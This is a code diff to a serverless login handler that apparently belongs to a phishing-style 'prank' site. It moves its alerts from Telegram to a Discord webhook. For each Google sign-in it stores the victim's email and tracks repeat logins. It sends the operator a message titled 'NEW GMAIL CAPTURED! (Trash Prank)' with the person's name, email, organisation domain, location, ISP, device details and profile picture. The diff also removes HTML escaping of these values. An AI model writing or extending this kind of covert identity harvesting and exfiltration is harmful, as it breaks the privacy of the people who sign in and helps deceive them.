@@ -1,9 +1,8 @@
 import {
   n,
-  escapeHtml,
   extractCfMeta,
   resolveVisitorId,
-  sendTelegramMessage,
+  sendDiscordWebhook,
 } from "../_lib/analytics.js";
 
 const JSON_HEADERS = { "Content-Type": "application/json" };
@@ -163,7 +162,6 @@ export async function onRequestPost(context) {
       )
       .run();
 
-    // Link this email onto the matching row in `visitors` if present
     await env.DB.prepare(
       "UPDATE visitors SET gmail_email = ? WHERE visitor_id = ?"
     )
@@ -174,20 +172,30 @@ export async function onRequestPost(context) {
       [cfMeta.city, cfMeta.region, cfMeta.country].filter(Boolean).join(", ") || "Unknown";
 
     const lines = [
-      isReturning
-        ? `🎣 <b>Returning Gmail Login (#${loginCount})</b>`
-        : `🎣 <b>NEW GMAIL CAPTURED! (Trash Prank)</b>`,
-      `👤 <b>Name:</b> ${escapeHtml(payload.name || "Unknown")}`,
-      `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>`,
-      payload.hd ? `🏢 <b>Org Domain:</b> ${escapeHtml(payload.hd)}` : null,
-      `📍 <b>Location:</b> ${escapeHtml(location)}`,
-      `🌐 <b>ISP:</b> ${escapeHtml(cfMeta.isp_org || "Unknown")}`,
-      `💻 <b>Device:</b> ${escapeHtml(client.browser || "?")} on ${escapeHtml(client.os || "?")} (${escapeHtml(client.screenRes || "?")})`,
-      client.refTag ? `🏷 <b>Ref Tag:</b> <code>${escapeHtml(client.refTag)}</code>` : null,
-      `🆔 <code>${escapeHtml(visitorId)}</code>`,
+      `👤 **Name:** ${payload.name || "Unknown"}`,
+      `📧 **Email:** \`${email}\``,
+      payload.hd ? `🏢 **Org Domain:** ${payload.hd}` : null,
+      `📍 **Location:** ${location}`,
+      `🌐 **ISP:** ${cfMeta.isp_org || "Unknown"}`,
+      `💻 **Device:** ${client.browser || "?"} on ${client.os || "?"} (${client.screenRes || "?"})`,
+      client.refTag ? `🏷 **Ref Tag:** \`${client.refTag}\`` : null,
     ].filter(Boolean);
 
-    context.waitUntil(sendTelegramMessage(env, lines.join("\n")));
+    const embed = {
+      title: isReturning
+        ? `🎣 Returning Gmail Login (#${loginCount})`
+        : `🎣 NEW GMAIL CAPTURED! (Trash Prank)`,
+      description: lines.join("\n"),
+      color: isReturning ? 0xa855f7 : 0xf59e0b,
+      footer: { text: `ID: ${visitorId}` },
+      timestamp: now,
+    };
+
+    if (payload.picture) {
+      embed.thumbnail = { url: payload.picture };
+    }
+
+    context.waitUntil(sendDiscordWebhook(env.DISCORD_WEBHOOK_GMAIL, embed));
 
     return new Response(
       JSON.stringify({ ok: true, loginCount, isReturning }),
